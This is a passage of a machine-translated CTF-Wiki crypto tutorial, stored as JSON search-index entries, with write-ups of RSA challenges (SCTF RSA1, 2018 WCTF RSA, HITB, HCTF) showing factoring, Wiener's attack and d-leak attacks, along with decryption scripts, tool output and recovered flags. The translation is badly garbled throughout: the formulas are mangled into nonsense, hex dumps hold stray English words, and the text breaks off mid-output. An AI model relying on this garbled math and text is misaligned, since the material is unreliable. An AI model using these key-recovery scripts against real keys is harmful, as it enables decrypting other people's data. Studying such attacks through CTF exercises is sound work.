fc:90:b2:00:62:4b:53:18:5b:a2:30:10:60:a8:21: ab: 61 : 57 : d7: e7: cc: 67 : 1b: 4d: cd: 66 : 4c: 7d: f1: 1a: 2a:1d:5e:50:80:c1:5e:45:12:3a:ba:4a:53:64:d8: ( A5: 1 : 84 : 4a: a: 5c: 55 : 02 : e8: 8e: 56 : 4d: 38 : 70 : a5: 16 : 36 : d3: bc: 14 : 3e: 2f: ae: 2f: 31 : 58 : ba: 00 : ab: ac: c0:c5:ba:44:3c:29:70:56:01:6b:57:f5:d7:52:d7: 31 : 56 : 0b: ab: 0a: e6: 8d: ad: 08 : 22 : a9: 1f: cc: 01 : 4c: 12 : d2: ab: a3: a5: 97 : e5: 10 : 49 : 19 : 7f: d9:3b:c5:53:53:71:00:18:60:cc:69:1a:06:64:3b: 86 : 94 : 70 : a9: yes: 82 : fc: 54 : 6b: 06 : 23 : 43 : eb: b6: 1b: 91 : 35 : 5e: 53 : a6: e5: d8: 9a: 84 : b8: 9f: 63 : bc: 70 : 06 : 2d: 59 : d8: 62 : a5: fd: 5c: ab: 06 : 68 :81 Exponent: 65537 ( 0x10001 ) Modulus = 94A03E6E0EDCF2741052EF1EEAA889D6F98D011151DB5E909248FD390C708724D8983CF3331CBAC561C2CE2C5AF15E65B2B2469156B619D5D3B2A6BBA37D5693994D7E4C2FAA607B3EC8FC90B200624B53185BA2301060A821AB6157D7E7CC671B4DCD664C7DF11A2A1D5E5080C15E45123ABA4A5364D8721F844AAE5C5502E88E564D3870A51636D3BC143E2FAE2F3158BA00ABACC0C5BA443C297056016B57F5D752D731560BAB0AE68DAD0822A91FCB6E49CC014C12D2ABA3A597E51049197F69D93BC5535371001860CC691A06643B869470A9DA82FC546B0623432DB020EBB61B91355E53A6E5D89A84BB3046B89F63BC70062D59D862A5FD5CAB066881 writing RSA key -----BEGIN PUBLIC KEY----- MIIBIjANBgkqkkiG9w0BAQEFAAOCAQ8AMIIBCgKCQQll + bg7c8nQQUu8e6qiJ 1vmNARFR216Qkkj9OQxwhyTYmDzzMxy6xWHCzixa8V5lsrJGkVa2GdXTsqa7o31W k5lNfkwvqmB7Psj8kLIAYktTGFuiMBBgqCGrYVfX58xnG03NZkx98RoqHV5QgMFe RRI6ukpTZNhyH4RKrlxVAuiOVk04cKUWNtO8FD4vri8xWLoAq6zAxbpEPClwVgFr V / XXUtcxVgurCuaNrQgiqR / LbknMAUwS0qujpZflEEkZf2nZO8VTU3EAGGDMaRoG ZDuGlHCp2oL8VGsGI0MtsCDrthuRNV5TpuXYmoS7MEa4n2O8cAYtWdhipf1cqwZo DOWNLOAD -----END PUBLIC KEY----- It is found that although it is 2048 bits, it is obvious that the modulus is not so long. Try to decompose and get p=250527704258269 q=74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349 Then you can construct and decrypt, the code is as follows from Crypto.PublicKey import RSA import gmpy2 from base64 import b64decode p = 250527704258269 q = 74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349 e = 65537 n = p * q def getprivatekey ( n , e , p , q ): Phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) priviatekey = RSA . construct (( long ( n ), long ( e ), long ( d ))) with open ( 'private.pem' , 'w' ) as f : f . write ( priviatekey . exportKey ()) def decrypt (): with open ( './level1.passwd.enc' ) as f : cipher = f . read () cipher = b64decode ( cipher ) with open ( './private.pem' ) as f : key = RSA . importKey ( f ) print key . decrypt ( cipher ) #getprivatekey(n, e, p, q) decrypt () Found wrong \u279c level0 git: ( master ) \u2717 python exp.py A bunch of garbled. . At this time, we must consider other situations. Generally speaking, the RSA implemented in reality will not directly use the original RSA, and will add some padding such as OAEP. Let's try and modify the code here. def decrypt1 () : with open ( './level1.passwd.enc' ) as f: cipher = f.read () cipher = b64decode ( cipher ) with open ( './private.pem' ) as f: key = RSA.importKey ( f ) key = PKCS1_OAEP.new ( key ) print key.decrypt ( cipher ) Sure enough, get \u279c level0 git: ( master ) \u2717 python exp.py FaC5ori1ati0n_aTTA3k_p_tOO_sma11 Get the decompression password. Go ahead and look at the public key in level1 \u279c level1 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 2048 bit ) Modulus: 00 : c3: 26 : 59 : 69 : e1: ed: 74 : d2: e0: b4: 9a: d5: 6a: 2f: 2a: 9e: c3: 71 : ff: 13 : 4b: 10 : 37 : c0: 6f: 56 : 19 : 34 : c5: cb: 1f: 6d: c0: e3: 57 : 3b: 47 : c4: 11 :11:78:d4:ee:4f:e8:99:2b:15:cb:cb:d7:73:e4: f9:a6:28:20:fd:db:8c:ea:16:ed:67:c2:48:12:6e: 4b: 01 : 53 : 4a: 67 : cb: 22 : 23 : 3b: 34 : 2e: af: 13 : ef: 93 :45: 16 : 2b: 00 : 9f: e0: 4b: d1: 90 : c9: 2c: 3f: d7: ee: 40 : f5: aa: 8c: e9: c2: 7b: f4: 36 : e3: 38 : 9d: 04 : 50 : db: a9: b7: 3f: 4b: 2a: d6: 87 : 2a: eb: 74 : 35 : 98 : 6a: 9c: e4: 52 : cb: 93 : 78 : 39 :83:f3:0c:d1:65:1e:66:9c:40:56:06:0d:58:fc: 41 : 64 : 5e: 06 : yes: 83 : d0: 3b: 06 : 42 : 70 : 54 :35:53:ce:de:79:4a:bf:f5:3b:e5:53:7f:6c:18: 12 : 67 : a9: de: 37 : 7d: 44 : 65 : 5e: 68 : 0 : 78 : 39 : 3d: bb: 00 : 22 : 35 : 0e: a3: 94 : e6: 94 : 15 : 1a: 3d: 39 : c7: 50 : 0e: b1: 64 : a5: 29 : 40 : 69 : 94 : b0: 0d: 1a: ea: 9a: And it & #39;s not like that. 3e: 7d Exponent: 65537 ( 0x10001 ) Modulus = C3265969E1ED74D2E0B49AD56A7C2F2A9EC371FF134B1037C06F561934C5CB1F6DC0E3573B47C4763E21A3B0111178D4EE4FE8992B15CBCBD773E4F9A62820FDDB8CEA16ED67C248126E4B01534A67CB22233B342EAF13EF9345162B009FE04BD190C92C279A34C33FD7EE40F5825039AA8CE9C27BF436E3389D0450DBA9B73F4B2AD68A2A5C872AEB7435986A9CE452CB9378D2DA3983F30CD1651E669C4056060D58FC41645E06DA83D03B064270DA3853E0543553CEDE794ABFF53BE5537F6C181267A9DE377D44655E680A78393DBB0022350EA394E694151A3D39C7500EB164A529A36941406994B00D1AEA9A122750EE1E3A19B72970B46D1E9D613E7D writing RSA key -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwyZZaeHtdNLgtJrVan Kp7Dcf8TSxA3wG9WGTTFyx9twONXO0fEdj4ho7AREXjU7k/omSsVy8vXc+T5pigg /duM6hbtZ8JIEm5LAVNKZ8siIzs0Lq8T75NFFisAn+BL0ZDJLCeaNMM/1+5A9YJQ OaqM6cJ79DbjOJ0EUNuptz9LKtaKKlyHKut0NZhqnORSy5N40to5g/MM0WUeZpxA VgYNWPxBZF4G2oPQOwZCcNo4U + BUNVPO3nlKv / U75VN / bBgSZ6neN31EZV5oCng5 PbsAIjUOo5TmlBUaPTnHUA6xZKUpo2lBQGmUsA0a6poSJ1DuHjoZtylwtG0enWE+ FQIDAQAB -----END PUBLIC KEY----- It seems that it is still not very big, break down again, and then try the factordb not, try yafu. The result is broken down. P309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496383 P309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496259 It can be found that these two numbers are very similar, and it may be that factordb does not implement this type of decomposition. Then the following operation is similar to level0. Just this time it is just a direct decryption, no filling, try to fill but wrong Get the password fA35ORI11TLoN_Att1Ck_cL0sE_PrI8e_4acTorS . Continue to the next step to view the public key \u279c level2 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 1025 bit ) Modulus: 01 : ba: 0c: c2: 45 : b4: 5c: e5: b5: f5: 6c: d5: ca: a5: 90 : c2:8d:12:3d:8a:6d:7f:b6:47:37:fb:7c:1f:5a:85: 8c:1e:35:13:8b:57:b2:21:4f:f4:b2:42:24:5f:33: f7: 2c: 2c: 0d: 21 : c2: 4a: d4: c5: f5: 09 : 94 : c2: 39 : 9d: 73 : e5: 04 : a2: 66 : 1d: 9c: 4b: 99 : d5: 38 : 44 : cd: 12 : a4: d0: 16 : 79 : f0: ac: 75 : f9: a4: ea: a8: 7c: 32 : 16 : 9 : 17 : d7: 7d: 80 : f: 60 : 29 : 64 : c7: ea: 50 : 30 : 63 : 76 :59:c7:36:5e:98:d2:ea:5b:b3:3a:47:17:08:2d: d5: 24 : 7d: 4f: a7: a1: f0: d5: 73 Exponent: 01 :00:8e:81:dd:a0:e3:19:28:e8:ee:51:11:08:c7: 50 :5f:61:31:05:d2:e2:ff:9b:83:71:e4:29:c2:dd: 92 :70:65:d4:09:6d:58:c3:76:31:07:f1:d4:fc:cf: 2d: b3: 0a: 6d: 02 : 7c: 56 : 61 : 7c: 7e: db: 28 : 66 : 9e: fb: 3d: 2f: 2c: 20 : 59 : 3c: 21 : ef: ff: 31 : 00 : 6a: 68 : 4a: 0a: 4c: 1a: a7: 09 : d5: 48 : 98 : c8: 1f:cf:fb:dd:f7:9c:ae:ae:0b:15:f4:b2:c7:e0:bc: ba: 31 : 4f: 5e: 07 : 83 : to: 0e: 7f: b9: 82 : a4: d2: 01 : ago: 68 : 29 : 6d: 66 : 7c: cf: 57 : b9: 4b Modulus = 1BA0CC245B45CE5B5F56CD5CAA590C28D123D8A6D7FB64737FB7C1F5A858C1E35138B57B2214FF4B242245F33F72C2C0D21C24AD4C5F50994C2399D73E504A2661D9C4B99D53844AB13D9CD12A4D01679F0AC75F9A4EAA87C32169A17D77D80FD602964C7EA5030637659C7365E98D2EA5BB33A4717082DD5247D4FA7A1F0D573 writing RSA key -----BEGIN PUBLIC KEY----- MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQG6DMJFtFzltfVs1cqlkMKN Ej2KbX+2Rzf7fB9ahYweNROLV7IhT/SyQiRfM/csLA0hwkrUxfUJlMI5nXPlBKJm HZxLmdU4RKsT2c0SpNAWefCsdfmk6qh8MhaaF9d9gP1gKWTH6lAwY3ZZxzZemNLq W7M6RxcILdUkfU+nofDVcwKBgQEAjoHdoOMZKOjuUREIx1BfYTEF0uL/m4Nx5CnC 3ZJwZdQJbVjDdjEH8dT8zy2zCm0CfFZhfL5 + C37ZIihmnvs9LywgWTwh7 / 8xAGr7 p2jeSgpMGqcJ1UiYyB/P+933nK6uCxX0ssfgvLoxT14Hg60Of7mCpNIB+mgpbWZ8 z1e5Sw == -----END PUBLIC KEY----- It is found that the private keys e and n are almost the same size. Considering that d is relatively small, use Wiener's Attack. Get d, of course, you can verify it again. \u279c level2 git: ( master ) \u2717 python RSAwienerHacker.py Testing Wiener Attack Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- At this time we decrypt the ciphertext and decrypt the code as follows from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 , PKCS1_OAEP import gmpy2 from base64 import b64decode d = 29897859398360008828023114464512538800655735360280670512160838259524245332403 L with open ( './public.key' ) as f : key = RSA . importKey ( f ) n = key . n e = key . e def getprivatekey ( n , e , d ): priviatekey = RSA . construct (( long ( n ), long ( e ), long ( d ))) with open ( 'private.pem' , 'w' ) as f : f . write ( priviatekey . exportKey ()) def decrypt (): with open ( './level3.passwd.enc' ) as f : cipher = f . read () with open ( './private.pem' ) as f : key = RSA . importKey ( f ) print key . decrypt ( cipher ) getprivatekey ( n , e , d ) decrypt () Use the string wIe6ER1s_1TtA3k_e_t00_larg3 at the end to decrypt the compressed package, taking care to remove B. At this point, all decryption ends and a flag is obtained.","title":"SCTF RSA1"},{"location":"crypto/asymmetric/rsa/rsa_complex/#2018-wctf-rsa","text":"The basic description of the topic is Description: Encrypted message for user \"admin\": <<<320881698662242726122152659576060496538921409976895582875089953705144841691963343665651276480485795667557825130432466455684921314043200553005547236066163215094843668681362420498455007509549517213285453773102481574390864574950259479765662844102553652977000035769295606566722752949297781646289262341623549414376262470908749643200171565760656987980763971637167709961003784180963669498213369651680678149962512216448400681654410536708661206594836597126012192813519797526082082969616915806299114666037943718435644796668877715954887614703727461595073689441920573791980162741306838415524808171520369350830683150672985523901>>> admin public key: n = 483901264006946269405283937218262944021205510033824140430120406965422208942781742610300462772237450489835092525764447026827915305166372385721345243437217652055280011968958645513779764522873874876168998429546523181404652757474147967518856439439314619402447703345139460317764743055227009595477949315591334102623664616616842043021518775210997349987012692811620258928276654394316710846752732008480088149395145019159397592415637014390713798032125010969597335893399022114906679996982147566245244212524824346645297637425927685406944205604775116409108280942928854694743108774892001745535921521172975113294131711065606768927 e = 65537 Service: http://36.110.234.253 There is no way to get the binary online now. The binary obtained is now downloaded. We need to log in to the user's admin to download the corresponding generator. By simply reversing this generator, we can see that this program works like this. Iteratively decrypts the data after a certain fixed location** with a user-specified license (32 bytes), each set of 32 bytes, different from the key or the result. The key is generated by k_1=key k_1=key k_2 =sha256(k_1) k_2 =sha256(k_1) ... k_n=sha256(k_{n-1}) k_n=sha256(k_{n-1}) Among them, the fixed position is the position where the ENCRYPTED appears for the second time in the source file generator , and then offset by 32 bytes. _ENCRYPT_STR = ENCRYPTED_STR ; v10 = 0 ; ENCRYPTED_LEN = strlen ( ENCRYPTED_STR ); do { do ++ v9 ; while ( strncmp ( & file_contents [ v9 ], _ENCRYPT_STR , ENCRYPTED_LEN ) ); ++ v10 ; } while ( v10 <= 1 ); v11 = & file_start_off_32 [ loc2 + ENCRYPTED_LEN ]; v12 = loc2 + ENCRYPTED_LEN ; len = file_size - ( loc2 + ENCRYPTED_LEN ) - 32 ; decrypt ( & file_start_off_32 [ v12 ], & license , len ); sha256_file_start ( v11 , len , & output ); if ( ! memcmp ( & output , & file_contents [ v12 ], 0x20 u ) ) { v14 = fopen ( \"out.exe\" , \"wb\" ); fwrite ( v11 , 1 u , len , v14 ); fclose ( v14 ); sprintf ( byte_406020 , \"out.exe %s \" , argv [ 1 ]); system ( byte_406020 ); } At the same time, we need to ensure that the hash of the generated file is exactly the specified value. Since the file is an exe file at the end, we can think that the last file header is the standard exe file, so we don't need to know the original. The license file, and then we can write a python script to generate the exe. In the generated exe, we analyze the basic flow of the program as Read the license 2. Use the license as the seed to generate pq separately. 3. Use p,q to generate n,e,d. The vulnerability appears on the method of generating p, q, and the method of generating p and q is similar. If we carefully analyze the function of generating prime numbers, we can see that each prime number is generated in two parts. Generate 512 bits in the left half. Generate the right half of the 512 bits. The left and right 1024 bits are determined to determine whether it is a prime number. If the prime number is successful, it is not a prime number and continues to be generated. The way to generate each part is the same, in the way sha512 ( const1 | const2 | const3 | const4 | const5 | const6 | const7 | const8 | v9 ) v9 = r % 1000000007 Only v9 will change, but its scope is fixed. So if we say p,q is p=a*2^{512}+b p=a*2^{512}+b q=c*2^{512}+d q=c*2^{512}+d Then $ n = pq = a * 2 ^ {1024} + (ad + bc) * 2 ^ {512} + bd $ Then $ N equiv bd way 2 ^ {512} $ And since p and q are generated, a, b, c, and d have only 1000000007 possibilities. Furthermore, we can enumerate all the possibilities, first calculate the possible set of b as S, and we use the intermediate encounter attack to calculate n/d \\equiv b \\bmod 2^{512} n/d \\equiv b \\bmod 2^{512} Since b and d are both the mantissa of p, they must not be a multiple of 2, and there must be an inverse. Although this can be done, however, we can simply calculate the storage space. 64*1000000007 / 1024 / 1024 / 1024=59 64*1000000007 / 1024 / 1024 / 1024=59 That means 59 G is needed, too big, so we still need to think further $ N equiv bd way 2 ^ {64} $ In this way, our memory demand dropped to around 8 G in an instant. We still use the enumeration method to perform the operation. Second, we can't use python, python takes up too much space, so it needs to be written in c/c++. Enumerate all possible d to calculate the corresponding value n/d n/d If the corresponding value is in set S, then we can think of finding a pair of legal b and d, so we can recover half of p and q. After that, we $ B = n ^ {1024} and * 2 + (a + b) * 2 ^ {$ 512} Can get $ Frac {n} {2-b ^} = {512} and {512} * 2 ^ + b + for $ $ Frac {n} {2-bd} ^ {512} equiv ad + bc way 2 ^ {512} $ Similarly, we can calculate a and c so that we can fully recover p and q. In the process of solving the concrete, when we find part of p and q, we can find that because it is modulo 2^{64} 2^{64} , there may be a collision (but in fact, one is p, the other is q, just symmetry.). Below we find the v9 corresponding to b. Note: The space enumerated here takes up approximately 11 Gs (including the index), so choose the appropriate location. b64: 9646799660ae61bd idx_b: 683101175 idx_d: 380087137 search 23000000 search 32000000 search 2b000000 search d000000 search 3a000000 search 1c000000 search 6000000 search 24000000 search 15000000 search 33000000 search 2c000000 search e000000 b64: 9c63259ccab14e0b idx_b: 380087137 idx_d: 683101175 search 1d000000 search 3b000000 search 7000000 search 16000000 search 25000000 search 34000000 In fact, after we actually get a part of p or q, the other part can be obtained by violent enumeration, because the calculation is almost the same, and the final result is ... hash 7000000 hash 30000000 p = 13941980378318401138358022650359689981503197475898780162570451627011086685747898792021456273309867273596062609692135266568225130792940286468658349600244497842007796641075219414527752166184775338649475717002974228067471300475039847366710107240340943353277059789603253261584927112814333110145596444757506023869 q = 34708215825599344705664824520726905882404144201254119866196373178307364907059866991771344831208091628520160602680905288551154065449544826571548266737597974653701384486239432802606526550681745553825993460110874794829496264513592474794632852329487009767217491691507153684439085094523697171206345793871065206283 plain text 13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885 hash 16000000 hash 25000000 hash b000000 hash 34000000 hash 1 a000000 ... \u279c 2018 - WCTF - rsa go to : ( master ) \u2717 python Python 2.7 . 14 ( default , Mar 22 2018 , 14 : 43 : 05 ) [ GCC 4.2 . 1 Compatible Apple LLVM 9.0 . 0 ( clang - 900.0 . 39.2 )] on darwin Type \"help\" , \"copyright\" , \"credits\" or \"license\" for more information . >>> p = 13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885 >>> hex ( p )[ 2 :] . decode ( 'hex' ) Traceback ( most recent call last ): File \"<stdin>\" , line 1 , in < module > File \"/usr/local/Cellar/python@2/2.7.14_3/Frameworks/Python.framework/Versions/2.7/lib/python2.7/encodings/hex_codec.py\" , line 42 , in hex_decode output = binascii . a2b_hex ( input ) TypeError : Odd - length string >>> hex ( p )[ 2 : - 1 ] . decode ( 'hex' ) 'flag {fa6778724ed740396fc001b198f30313} ' Finally we got the flag. Please refer to the ctf-challenge repository for detailed utilization code. Related compilation instructions need to link related libraries. g++ exp2.cpp -std = c++11 -o main2 -lgmp -lcrypto -pthread","title":"2018 WCTF RSA"},{"location":"crypto/asymmetric/rsa/rsa_complex/#reference","text":"https://upbhack.de/posts/wctf-2018-writeup-rsa/","title":"Reference"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/","text":"d Leak attack \u00b6 Attack principle \u00b6 First, when d is leaked, we can naturally decrypt all encrypted messages. We can even decompose the modulus N. The basic principle is as follows We know ed \\equiv 1 \\bmod \\varphi(n) ed \\equiv 1 \\bmod \\varphi(n) , then \\varphi(n) | k=ed-1 \\varphi(n) | k=ed-1 . Obviously k is an even number, we can make k=2^tr k=2^tr , where r is odd and t is not less than 1. So for any number g that is relative to N, we have g^k \\equiv 1 \\bmod n g^k \\equiv 1 \\bmod n . Then z=g^{\\frac{k}{2}} z=g^{\\frac{k}{2}} is the quadratic root of the modulo N. Then we have $$ z^2 \\equiv 1 \\bmod p \\ z^2 \\equiv 1 \\bmod q $$ Furthermore, we know that the equation has the following four solutions, the first two are $$ x equiv PM1 N way $$ The last two are \\pm x \\pm x , where x satisfies the following conditions $$ x equiv 1 p \\ way x equiv -1 q way $$ Obviously, z=g^{\\frac{k}{2}} z=g^{\\frac{k}{2}} satisfies the latter condition, and we can calculate gcd(z-1,N) gcd(z-1,N) to decompose N. Tools \u00b6 Use the following tools to perform calculations directly RsaConverter.exe ( https://sourceforge.net/projects/rsaconverter/ , for windows ) rsatool.py 2017 HITB - hack in the card II \u00b6 The second smart card sent to us has been added some countermeasures by that evil company. They also changed the public key(attachments -> publickey.pem). However it seems that they missed something...... Can you decrypt the following hex-encoded ciphertext this time? ``` > 016d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977 ``` This question is a question that follows 2017 HITB - hack in the card I. We use openssl to view the public key of publickey.pem and find that its N is the same as the N of the previous question, and the N of the previous question, e,d is known. Thus, you can directly use the above rsatool.py to get p, q, and calculate e from the e of this problem to get the plain text. Wiener's Attack \u00b6 Attack conditions \u00b6 When d is small ( d<\\frac{1}{3}N^{\\frac{1}{4}} d&lt;\\frac{1}{3}N^{\\frac{1}{4}} ), an attacker can use Wiener's Attack to get the private key. Attack principle \u00b6 https://en.wikipedia.org/wiki/Wiener%27s_attack https://sagi.io/2016/04/crypto-classics-wieners-rsa-attack/ Tools \u00b6 https://github.com/pablocelayes/rsa-wiener-attack Comprehensive example \u00b6 2016 HCTF RSA1 \u00b6 Here we take the RSA 1 - Crypto So Interesting in the 2016 HCTF as an example, [source code link] ( https://github.com/Hcamael/ctf-library/tree/master/RSA1 ). First, bypass the proof part of the program, and you can bypass it with almost random data. Second, let's analyze the specific code part. The program gets the flag according to our token. Here we directly use the token provided in the source code. print \"This is a RSA Decryption System\" print \"Please enter Your team token: \" token = raw_input () try : flag = get_flag ( token ) assert len ( flag ) == 38 except : print \"Token error!\" m_exit ( - 1 ) Next we first know n=pq n=pq , let's take a closer look at how this e, d is obtained. p = getPrime ( 2048 ) q = getPrime ( 2048 ) n = p * q e , d = get_ed ( p , q ) print \"n: \" , hex ( n ) print & quot ; e : & quot ;, hex ( e ) get_ed function is as follows def get_ed ( p , q ): k = cal_bit ( q * p ) phi_n = ( p - 1 ) * ( q - 1 ) r = random . randint ( 10 , 99 ) while True : u = getPrime ( k / 4 - r ) if gcd ( u , phi_n ) != 1 : continue t = invmod ( u , phi_n ) e = pi_b ( t ) if gcd ( e , phi_n ) == 1 : break d = invmod ( e , phi_n ) return ( e , d ) It can be seen that the number of bits we get is less than a quarter of the number of bits in n, which is almost the same as Wiener's Attack. And we calculated u, t, e, d also meet the following conditions $$ \\begin{align*} out & equals 1 bmod varphi (n) Others & equiv 1 bt \\ way ed &\\equiv 1 \\bmod \\varphi(n) \\end{align*} $$ According to the conditions given in the title, we already know n, e, bt. So first we can know e according to the second formula above. At this time, you can use the first formula for Wiener's Attack to get u. Then we can use the private key index to leak the attack to decompose N to get p, q. Then we can get d. First we bypassed proof and got N, e. The encrypted flag is as follows n: 0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451 is: flag: 0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df Secondly, use the following method to get Wiener's Attack to get u, as follows if __name__ == \"__main__\" : bt = e = t = gmpy2 . invert ( e , bt ) n = 0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451 solve ( n , t ) The solve function is the function of the corresponding Wiener's Attack. We got u as follows \u279c rsa-wiener-attack git: ( master ) \u2717 python RSAwienerHacker.py Testing Wiener Attack Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 